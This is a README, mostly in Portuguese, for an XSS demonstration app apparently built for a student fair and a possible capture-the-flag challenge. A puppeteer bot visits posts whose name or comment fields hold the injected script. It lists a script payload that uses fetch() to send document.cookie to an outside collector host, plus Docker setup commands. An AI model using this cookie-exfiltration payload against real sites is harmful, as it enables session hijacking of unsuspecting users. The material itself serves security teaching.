






# Demonstração XSS

Demonstração de XSS para ser exibida na feira dos bixos. Pode ser expandido para um desafio de 
XSS a ser usado no Ping se necessário!

# Payloads:

Tanto o campo nome quanto comentário podem ser utilizados para enviar o XSS na página do post.
Após o envio basta compartilhar a URL no formulário do menu lateral para que o bot (puppeteer)
acesse e execute o payload.

Obs: é feita a verificação se o link pertence ou não ao site, mas como o site é vulneravel a XSS
se alguem quiser que ele acesse outra url é bastante simples via javascript. É necessário configurar corretamente as variáveis do arquivo `.env` para garantir que tudo ocorra nos conformes.

```html
<script>alert('xss');</script>
<script>fetch('https://ent6k7fximtwm.x.pipedream.net/c=' + document.cookie);</script>
```

# Executing the docker

```bash
sudo docker build --no-cache -t "ganesh/demo-xss" .
```

```bash
sudo docker run -d -p "80:80" --rm --name "ganesh-demo-xss" "ganesh/demo-xss"
```